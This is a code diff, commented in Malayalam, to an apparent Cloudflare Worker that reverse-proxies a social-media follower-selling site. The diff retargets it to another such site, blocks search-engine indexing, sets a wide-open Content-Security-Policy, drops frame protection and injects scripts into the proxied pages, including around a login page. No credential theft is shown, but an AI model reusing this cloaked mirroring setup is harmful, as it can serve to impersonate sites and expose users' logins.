@@ -1,4 +1,4 @@
-const TARGET_URL = "https://takipcikrali.com/tools/send-follower/70220054978"; 
+const TARGET_URL = "https://fastfollow.in"; 
 
 export default {
   async fetch(request, env, ctx) {
@@ -29,6 +29,17 @@ export default {
 
     const response = await fetch(modifiedRequest);
     const responseHeaders = new Headers(response.headers);
+
+    // --- കൂട്ടിച്ചേർത്ത Security & No-Index Headers ---
+    responseHeaders.set("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
+    responseHeaders.set("X-Content-Type-Options", "nosniff");
+    responseHeaders.set("Referrer-Policy", "strict-origin-when-cross-origin");
+    // സെർച്ച് എഞ്ചിൻ ക്രോളറുകളെ തടയാൻ
+    responseHeaders.set("X-Robots-Tag", "noindex, nofollow, noarchive");
+    // ലളിതമായ CSP (നമ്മുടെ കസ്റ്റം inline സ്റ്റൈലുകളും സ്ക്രിപ്റ്റുകളും പ്രവർത്തിക്കാൻ പാകത്തിൽ)
+    responseHeaders.set("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;");
+    responseHeaders.delete("x-frame-options"); 
+    // ------------------------------------------------
 
     if ([301, 302, 303, 307, 308].includes(response.status)) {
       const location = responseHeaders.get("Location");
@@ -176,7 +187,10 @@ export default {
           }
         </style>
       `;
-      html = html.replace("</head>", customStyles + "</head>");
+      
+      // HTML-ൽ സെർച്ച് എഞ്ചിൻ ക്രോളറുകളെ തടയാനുള്ള Meta tag ചേർക്കുന്നു
+      const metaRobots = `<meta name="robots" content="noindex, nofollow, noarchive">\n`;
+      html = html.replace("</head>", metaRobots + customStyles + "</head>");
 
       // ലോഗിൻ പേജ് അല്ലെങ്കിൽ മാത്രം safeCleanup സ്ക്രിപ്റ്റ് ആഡ് ചെയ്യുന്നു (ലോഗിൻ ഫോം പൂർണ്ണമായി സുരക്ഷിതമാക്കാൻ)
       if (!isLogin) {
@@ -357,8 +371,7 @@ export default {
 
       responseHeaders.delete("content-encoding");
       responseHeaders.delete("content-length");
-      responseHeaders.delete("content-security-policy"); 
-      responseHeaders.delete("x-frame-options");
+      // CSP മുകളിൽ സെറ്റ് ചെയ്തതിനാൽ താഴെയുള്ള delete ഒഴിവാക്കി പകരം മുകളിലെ കോഡ് വർക്ക് ചെയ്യും.
 
       return new Response(html, {
         status: response.status,
